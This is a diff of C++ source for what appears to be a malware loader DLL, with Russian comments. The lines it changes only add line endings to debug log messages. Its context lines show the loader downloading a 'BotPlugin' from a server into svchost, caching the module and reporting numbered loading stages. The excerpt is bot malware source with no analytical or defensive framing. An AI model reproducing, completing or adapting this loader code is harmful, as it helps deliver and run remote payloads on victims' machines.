@@ -162,7 +162,7 @@ namespace DLLLoader
 
 
 		//Загружаем библиотеку
-		LDRDBG("BRDS", "Инициализируем загрузку плагина!");
+		LDRDBG("BRDS", "Инициализируем загрузку плагина!\r\n");
 
 		// 311_ld начало загрузки файла плага с сервера в svchost
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));
@@ -170,7 +170,7 @@ namespace DLLLoader
 
 		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
 
-		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);
+		LDRDBG("BRDS", "DownloadEx result module=0x%u\r\n", Module);
 
 		// 312_ld окончание загрузки файла плага с сервера в svchost
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("312_ld"));
@@ -199,7 +199,7 @@ namespace DLLLoader
 
 		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует
 
-		LDRDBG("BRDS", "DownloadMethod finised.");
+		LDRDBG("BRDS", "DownloadMethod finised.\r\n");
 
 		return 0;
 	}
@@ -454,7 +454,7 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 
 	DWORD Hash = STR::GetHash(ShortName, 0, true);
 
-	LDRDBG("BRDS", "LoaderDll loaded ...");
+	LDRDBG("BRDS", "LoaderDll loaded ...\r\n");
 
 	//// 301_ld запуск вообще (тут сети может не быть)
 	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));
@@ -486,14 +486,14 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		LPVOID Module = NULL;
 
 		//Загружаем библиотеку
-		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
+		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!\r\n");
 
 		// 315_ld начало загрузки файла плага методом LoadPlugToCache
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
 
 		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
 
-		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);
+		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u\r\n", Module);
 
 		// 316_ld окончание загрузки файла плага методом LoadPlugToCache
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));
@@ -501,7 +501,7 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		if (Module != NULL)
 		{
 			// Сохраняем данные в кэш
-			LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
+			LDRDBG("LoadPlugToCache", "Module successfuly loaded.\r\n");
 			
 			// 317_ld успешная загрузка файла плага методом LoadPlugToCache
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
